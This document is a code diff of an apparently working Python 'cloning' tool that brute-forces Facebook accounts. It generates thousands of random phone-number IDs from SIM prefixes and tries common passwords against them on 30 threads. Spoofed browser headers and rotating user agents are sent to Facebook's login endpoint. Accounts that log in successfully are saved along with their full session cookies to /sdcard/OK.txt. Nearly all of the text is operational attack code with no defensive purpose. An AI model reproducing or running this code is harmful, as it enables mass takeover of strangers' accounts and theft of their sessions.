+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m2') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,uid]
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+    
+def pass3():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m3') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,'khankhan']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass4():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m4') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass5():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m5') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = ['khankhan','ali786','ali123','ali1122','aliali']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def pass6():
+    os.system("clear")
+    print(logo)
+    clear()
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\033[0;m")
+    print('\033[1;97m====================================================') 
+    print(f'\033[1;97m[!] \033[1;92mBD SIM CODES  \033[1;91m: \033[1;96m88017, 88019, 88018, 88016')
+    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
+    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
+    print('\033[1;97m====================================================') 
+    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK [0300 / 0302 / 0306 / 0349 /0315]\033[0;m")
+    print('\033[1;97m====================================================') 
+    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
+    os.system("clear")
+    print(logo)
+    print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+    print('\033[1;97m====================================================') 
+    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
+    print('\033[1;97m====================================================') 
+    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as manshera:    
+        clear()
+        tl = str(len(user))
+        print(f"\033[1;97mTODAY DATE \033[1;91m: \033[1;92m{ha}/{bu}/{ta} \033[1;93m=== \033[1;97mTIME \033[1;92m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;97m====================================================') 
+        print(f"\033[1;97m[+]\033[1;92m USER NAME\033[1;91m                :\033[1;96m "+NameX)
+        print(f"\033[1;97m[+]\033[1;92m SIM NETWORK CODE YOU PUT\033[1;91m : \033[1;96m"+code)
+        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m                : \033[1;96m["+tl+"] ")
+        print('\033[1;97m[+]\033[1;92m PASSWORD METHOD\033[1;91m          : \033[1;96m6') 
+        print('\033[1;97m====================================================') 
+        print(' \033[1;32mPLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        print('\033[1;97m====================================================') 
+        for love in user:
+            uid = code+love
+            pwx = ['khankhan','malikmalik','malik123','malik12','malik786']
+            manshera.submit(freeq,uid,pwx,tl)
+    print('')
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
+    print('\033[1;97m====================================================') 
+    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/OK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/CP.txt')
+    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
+
+def freeq(uid,pwx,tl):
     global loop
-    global cps
-    global oks
-    global proxy
+    global ok
+    global cp
+    global ugen
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
+            bi = random.choice([A])
             session = requests.Session()
+            pro = random.choice(ugen)
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -306,52 +648,50 @@ def rcrack(uid,pwx,tl):
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":uid,
+            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
+            "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority':'www.facebook.com',
+            'method': 'GET',
+            'path':'https://www.facebook.com/?_rdc=1&_rdr',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'referer':'https://www.facebook.com/',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('    \033[1;32m(IRTAZA-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                uid = coki[151:166]
+                print(f'\r\33[1;97m[\033[1;96mSUCCESSFUL\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                 cek_apk(session,coki)
-                open('/sdcard/IRTAZA-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                break
+                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
             elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('    \33[1;30m(IRTAZA-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/IRTAZA-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    uid=coki[141:156]
+                    print(f'\r\33[1;97m[\033[1;91mCHECKPOINT\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
+                    open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[IRTAZA] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write(f'\r\33[1;37m[MMS] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
- 
-ud()
- 
+#---------------------[END MENU]---------------------#
+if __name__ == '__main__':
+    main()
